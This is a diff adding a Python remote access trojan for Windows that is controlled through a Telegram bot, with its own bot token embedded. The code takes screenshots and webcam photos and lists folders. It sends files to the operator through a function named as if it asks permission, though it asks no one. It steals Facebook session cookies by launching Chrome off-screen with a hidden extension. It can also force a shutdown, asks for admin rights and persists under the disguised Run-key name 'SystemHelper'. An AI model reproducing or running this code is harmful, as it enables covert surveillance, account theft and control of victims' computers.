@@ -1,0 +1,557 @@
+import os
+import platform
+import hashlib
+import telebot
+import tkinter as tk
+from tkinter import messagebox
+import threading
+import tempfile
+from PIL import ImageGrab
+import uuid
+import requests
+from PIL import Image
+import ctypes
+import sys
+import cv2
+import random
+import  string 
+import shutil
+
+import os
+import json
+import subprocess
+import tempfile
+import time
+import signal
+
+
+
+# === Cấu hình ===
+BOT_TOKEN = "8111204199:AAH5gFREuwkQotJRca7p41TJB_5jyjfAGn0"
+OWNER_ID = 6851056890  # ID Telegram của bạn (admin)
+bot = telebot.TeleBot(BOT_TOKEN)
+
+# Tạo ID máy (HWID hash → số ngắn)
+def get_hwid_short():
+    # Thu thập thông tin phần cứng
+    raw_data = (
+        platform.node() +
+        platform.system() +
+        platform.release() +
+        platform.version() +
+        platform.machine() +
+        platform.processor() +
+        str(uuid.getnode()) +
+        str(os.getpid())
+    )
+    
+    # Hash SHA256
+    hwid_hash = hashlib.sha256(raw_data.encode()).hexdigest()
+    
+    # Dùng hash làm seed để tạo 3 ký tự: Hoa - Thường - Số
+    seed = int(hwid_hash[:16], 16)
+    random.seed(seed)
+    
+    part1 = random.choice(string.ascii_uppercase)  # chữ hoa
+    part2 = random.choice(string.ascii_lowercase)  # chữ thường
+    part3 = random.choice(string.digits)           # số
+    
+    return f"{part1}{part2}{part3}"
+
+CLIENT_ID = get_hwid_short()
+
+# === Hàm gửi danh sách file ===
+def list_files():
+    file_paths = []
+    for root, dirs, files in os.walk("C:\\"):  # duyệt toàn bộ ổ C
+        for f in files:
+            try:
+                file_paths.append(os.path.join(root, f))
+            except Exception:
+                pass
+    return file_paths
+
+# === Hàm hỏi người dùng có cho gửi file không ===
+def ask_permission_and_send(chat_id, filepath):
+    def gui_thread():
+        try:
+            with open(filepath, "rb") as f:
+                bot.send_document(chat_id, f, caption=f"[ID {CLIENT_ID}] File: {filepath}")
+        except Exception as e:
+            bot.send_message(chat_id, f"[ID {CLIENT_ID}] ❌ Lỗi gửi file: {e}")
+
+    threading.Thread(target=gui_thread).start()
+
+# === Xử lý lệnh từ Telegram ===
+@bot.message_handler(commands=["start"])
+def send_online(message):
+    if message.chat.id == OWNER_ID:
+        bot.send_message(message.chat.id, f"✅ Máy đang online! ID: {CLIENT_ID}")
+
+# ___________________________________ SCREENSHOT  ______________
+
+
+@bot.message_handler(commands=["screenshot"])
+def handle_screenshot(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            bot.send_message(message.chat.id, "❌ Dùng: /screenshot <ID>")
+            return
+
+        target_id = parts[1]
+        if target_id != CLIENT_ID:
+            return  # Không phải máy này
+
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] 📸 Đang chụp ảnh màn hình, vui lòng đợi...")
+
+        screenshot = ImageGrab.grab()
+
+        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
+            screenshot.save(tmp_file.name, "PNG")
+            temp_path = tmp_file.name
+
+        with open(temp_path, "rb") as photo:
+            bot.send_photo(message.chat.id, photo, caption=f"[ID {CLIENT_ID}] Ảnh chụp màn hình")
+
+        os.remove(temp_path)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Lỗi khi chụp màn hình: {e}")
+
+
+
+
+
+
+# ___________________________________COOKIE ______________
+
+
+
+
+
+
+ 
+
+
+def list_chrome_profiles():
+    user_data_dir = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
+    if not os.path.exists(user_data_dir):
+        return []
+
+    profiles = []
+    for entry in os.listdir(user_data_dir):
+        profile_path = os.path.join(user_data_dir, entry)
+        if os.path.isdir(profile_path):
+            pref_file = os.path.join(profile_path, "Preferences")
+            if os.path.exists(pref_file):
+                try:
+                    with open(pref_file, "r", encoding="utf-8") as f:
+                        prefs = json.load(f)
+                        name = prefs.get("profile", {}).get("name", entry)
+                        profiles.append((name, entry))
+                except Exception:
+                    pass
+    return profiles
+
+def create_temp_extension():
+    ext_dir = tempfile.mkdtemp(prefix="my_extension_")
+    manifest = {
+        "manifest_version": 3,
+        "name": "Auto Facebook Cookie Downloader",
+        "version": "1.0",
+        "permissions": ["cookies", "downloads"],
+        "host_permissions": ["*://*.facebook.com/*"],
+        "background": {"service_worker": "background.js"}
+    }
+    with open(os.path.join(ext_dir, "manifest.json"), "w", encoding="utf-8") as f:
+        json.dump(manifest, f, indent=2)
+
+    background_js = """
+chrome.runtime.onInstalled.addListener(() => {
+    chrome.cookies.getAll({ domain: ".facebook.com" }, (cookies) => {
+        if (!cookies || cookies.length === 0) return;
+
+        const cookieString = cookies.map(c => `${c.name}=${c.value}`).join("; ");
+        const dataUrl = 'data:text/plain;charset=utf-8,' + encodeURIComponent(cookieString);
+
+        chrome.downloads.download({
+            url: dataUrl,
+            filename: "gvn.txt",
+            saveAs: false
+        }, (downloadId) => {
+            console.log("Download started:", downloadId);
+        });
+    });
+});
+    """
+    with open(os.path.join(ext_dir, "background.js"), "w", encoding="utf-8") as f:
+        f.write(background_js)
+
+    return ext_dir
+
+def run_all_profiles_cookie():
+    profiles = list_chrome_profiles()
+    if not profiles:
+        print("❌ Không tìm thấy profile nào trên máy.")
+        return
+
+    chrome_path = os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe")
+    if not os.path.exists(chrome_path):
+        chrome_path = os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe")
+    if not os.path.exists(chrome_path):
+        print("❌ Không tìm thấy chrome.exe")
+        return
+
+    processes = []
+    for idx, (name, folder) in enumerate(profiles, start=1):
+        extension_path = create_temp_extension()
+        p = subprocess.Popen([
+            chrome_path,
+            f"--profile-directory={folder}",
+            f"--load-extension={extension_path}",
+            "--new-window",
+            "--window-position=-32000,-32000",  # Đẩy ra ngoài màn hình
+            "--window-size=1,1",  # Thu nhỏ cửa sổ
+            "https://www.facebook.com"
+        ], shell=False)
+        print(f"🚀 Chrome chạy với profile {folder}, extension {extension_path}")
+        processes.append(p)
+
+    # Đợi download hoàn tất (ví dụ 5 giây)
+    time.sleep(1)
+    subprocess.run('taskkill /f /im chrome.exe', shell=True)
+    print("Đã kill tất cả chrome.exe")
+ 
+
+
+
+
+
+
+
+@bot.message_handler(commands=["cookie"])
+def handle_cookie(message):
+    if message.chat.id != OWNER_ID:
+        return
+
+    try:
+        # --- Tách ID từ lệnh /cookie <ID> ---
+        parts = message.text.split()
+        if len(parts) < 2:
+            bot.reply_to(message, "⚠️ Bạn phải nhập ID, /cookie <ID>")
+            return
+        cmd_id = parts[1]  # ID client được gửi kèm theo
+
+        download_dir = os.path.expanduser("~/Downloads")  # Thư mục Download mặc định
+
+        # --- Xóa file cũ trước khi chạy ---
+        for filename in os.listdir(download_dir):
+            filepath = os.path.join(download_dir, filename)
+            if os.path.isfile(filepath) and "gvn" in filename.lower() and filename.lower().endswith(".txt"):
+                try:
+                    os.remove(filepath)
+                except Exception as e:
+                    print(f"Lỗi xóa file cũ {filepath}: {e}")
+
+        # --- Kill Chrome và chạy lấy cookie ---
+        subprocess.run('taskkill /f /im chrome.exe', shell=True)
+        run_all_profiles_cookie()
+
+        # --- Gửi file cookie lên Telegram ---
+        for filename in os.listdir(download_dir):
+            filepath = os.path.join(download_dir, filename)
+            if os.path.isfile(filepath) and "gvn" in filename.lower() and filename.lower().endswith(".txt"):
+                try:
+                    with open(filepath, "rb") as f:
+                        bot.send_document(message.chat.id, f, caption=f"[ID {cmd_id}] 🍪 Cookie")
+                except Exception as e:
+                    print(f"Lỗi gửi file {filepath}: {e}")
+
+        # --- Xóa file sau khi gửi ---
+        for filename in os.listdir(download_dir):
+            filepath = os.path.join(download_dir, filename)
+            if os.path.isfile(filepath) and "gvn" in filename.lower() and filename.lower().endswith(".txt"):
+                try:
+                    os.remove(filepath)
+                except Exception as e:
+                    print(f"Lỗi xóa file sau khi gửi {filepath}: {e}")
+
+        bot.reply_to(message, f"[ID {cmd_id}] ✅ Đã lấy cookie từ tất cả profiles.")
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Lỗi khi xử lý: {e}")
+
+
+
+
+
+
+
+
+# ___________________________________ CD  ______________
+
+
+
+
+
+
+
+
+
+@bot.message_handler(commands=["cd"])
+def handle_cd(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split(maxsplit=2)
+        if len(parts) != 3:
+            bot.send_message(message.chat.id, "❌ Dùng: /cd <ID> <Đường dẫn>")
+            return
+
+        target_id = parts[1]
+        if target_id != CLIENT_ID:
+            return
+
+        folder_path = parts[2]
+        if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
+            bot.send_message(message.chat.id, f"❌ Thư mục không tồn tại: {folder_path}")
+            return
+
+        ext_groups = {}
+
+        for entry in os.listdir(folder_path):
+            full_path = os.path.join(folder_path, entry)
+            if os.path.isfile(full_path):
+                ext = os.path.splitext(entry)[1].lower() or "<no_ext>"
+                ext_groups.setdefault(ext, []).append(full_path)
+            elif os.path.isdir(full_path):
+                ext_groups.setdefault("<folder>", []).append(full_path)
+
+        if not ext_groups:
+            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Không tìm thấy file nào trong {folder_path}")
+            return
+
+        # chuẩn bị tin nhắn
+        lines = []
+        for ext, paths in sorted(ext_groups.items()):
+            lines.append(f"=== {ext} ({len(paths)} items) ===")
+            lines.extend(paths)
+            lines.append("")
+
+        tree_text = "\n".join(lines)
+
+        # Telegram giới hạn 4096 ký tự 1 tin nhắn, nên chia nhỏ nếu dài
+        max_len = 4000
+        for i in range(0, len(tree_text), max_len):
+            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}]\n{tree_text[i:i+max_len]}")
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Lỗi: {e}")
+
+
+
+# ___________________________________ SHUTDOWN  ______________
+
+
+
+# ==== Lệnh /shutdown ====
+@bot.message_handler(commands=["shutdown"])
+def handle_shutdown(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            bot.send_message(message.chat.id, "❌ Dùng: /shutdown <ID>")
+            return
+
+        target_id = parts[1]
+        if target_id != CLIENT_ID:
+            return
+
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] 💀 Đang tiến hành tắt máy...")
+        subprocess.Popen("shutdown /s /f /t 0", shell=True)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Lỗi: {e}")
+
+
+# ___________________________________ WALLPAPER  ______________
+
+
+
+
+def set_wallpaper(image_path: str):
+    """
+    Đổi hình nền Windows bằng file ảnh
+    """
+    abs_path = os.path.abspath(image_path)
+    SPI_SETDESKWALLPAPER = 20
+    SPIF_UPDATEINIFILE   = 0x01
+    SPIF_SENDCHANGE      = 0x02
+
+    result = ctypes.windll.user32.SystemParametersInfoW(
+        SPI_SETDESKWALLPAPER, 
+        0, 
+        abs_path, 
+        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
+    )
+    if not result:
+        raise ctypes.WinError()
+
+
+
+
+
+
+
+@bot.message_handler(commands=["wallpaper"])
+def handle_wallpaper(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split(maxsplit=2)
+        if len(parts) != 3:
+            bot.send_message(message.chat.id, "❌ Dùng: /wallpaper <ID> <URL Image>")
+            return
+
+        target_id = parts[1]
+        if target_id != CLIENT_ID:
+            return
+
+        url = parts[2]
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] 🌄 Đang tải hình nền từ {url}...")
+
+        # tải ảnh về file tạm
+        response = requests.get(url, timeout=15)
+        if response.status_code != 200:
+            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Không tải được ảnh từ URL.")
+            return
+
+        with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp:
+            tmp.write(response.content)
+            tmp_path = tmp.name
+
+        # convert sang BMP để Windows chắc chắn nhận
+        bmp_path = tmp_path + ".bmp"
+        Image.open(tmp_path).save(bmp_path, "BMP")
+
+        # set wallpaper
+        set_wallpaper(bmp_path)
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ✅ Hình nền đã được thay đổi!")
+
+        # dọn file
+        os.remove(tmp_path)
+        # giữ bmp lại (Windows cần file tồn tại để load)
+        # nếu muốn xóa luôn thì đổi thành os.remove(bmp_path)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Lỗi: {e}")
+
+
+
+
+
+# ___________________________________ SENDFILE  ______________
+
+
+
+@bot.message_handler(commands=["sendfile"])
+def handle_sendfile(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split(maxsplit=2)
+        if len(parts) < 3:
+            bot.send_message(message.chat.id, "❌ Dùng: /sendfile <ID> <đường_dẫn>")
+            return
+        target_id = parts[1]
+        filepath = parts[2]
+        if target_id != CLIENT_ID:
+            return  # không phải máy này
+        # hỏi user bằng GUI trước khi gửi
+        ask_permission_and_send(message.chat.id, filepath)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Lỗi: {e}")
+
+
+# ___________________________________ CAP  ______________
+
+
+
+
+# ====== Lệnh /capture ======
+@bot.message_handler(commands=["capture"])
+def handle_capture(message):
+    if message.chat.id != OWNER_ID:
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            bot.send_message(message.chat.id, "❌ Dùng: /capture <ID>")
+            return
+
+        target_id = parts[1]
+        if target_id != CLIENT_ID:
+            return
+
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] 📷 Đang bật webcam và chụp ảnh...")
+
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Không thể mở webcam!")
+            return
+
+        ret, frame = cap.read()
+        cap.release()
+        if not ret:
+            bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Không chụp được ảnh!")
+            return
+
+        with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp:
+            cv2.imwrite(tmp.name, frame)
+            tmp_path = tmp.name
+
+        with open(tmp_path, "rb") as f:
+            bot.send_photo(message.chat.id, f, caption=f"[ID {CLIENT_ID}] 📷 Ảnh webcam")
+
+        os.remove(tmp_path)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"[ID {CLIENT_ID}] ❌ Lỗi: {e}")
+
+
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(
+        None, "runas", sys.executable, ' '.join([f'"{arg}"' for arg in sys.argv]), None, 1)
+    sys.exit()
+
+import winreg
+ 
+exe_path = os.path.abspath(sys.executable)  # "chính tôi"
+ 
+if __name__ == "__main__":
+    print(f"Client started with ID: {CLIENT_ID}")
+
+
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+    winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, exe_path)
+    winreg.CloseKey(key)
+
+    bot.polling()
